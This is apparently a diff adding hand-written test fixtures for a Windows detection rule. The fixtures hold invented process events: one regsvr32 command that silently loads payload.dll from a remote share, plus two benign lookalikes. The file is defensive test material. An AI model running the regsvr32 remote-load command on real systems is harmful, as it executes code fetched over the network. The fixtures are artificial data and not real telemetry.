@@ -1,0 +1,12 @@
+# Hand-written fixtures (the converter does not generate them); values are invented.
+match:
+  - desc: "regsvr32 loads a DLL from a remote share"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 8221, "ppid": 4000, "exe": "C:\\Windows\\System32\\regsvr32.exe", "name": "regsvr32.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "regsvr32.exe /s \\\\10.0.0.9\\share\\payload.dll", "args": ["regsvr32.exe", "/s", "\\\\10.0.0.9\\share\\payload.dll"], "original_name": "REGSVR32.EXE", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+nomatch:
+  - desc: "benign lookalike - regsvr32 registers a local DLL"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 8231, "ppid": 4000, "exe": "C:\\Windows\\System32\\regsvr32.exe", "name": "regsvr32.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "regsvr32.exe /s C:\\Program Files\\Vendor\\addin.dll", "args": ["regsvr32.exe", "/s", "C:\\Program", "Files\\Vendor\\addin.dll"], "original_name": "REGSVR32.EXE", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+  - desc: "net use maps a share (different tool)"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 8232, "ppid": 4000, "exe": "C:\\Windows\\System32\\net.exe", "name": "net.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "net use Z: \\\\fileserver01\\home", "args": ["net", "use", "Z:", "\\\\fileserver01\\home"], "original_name": "net.exe", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
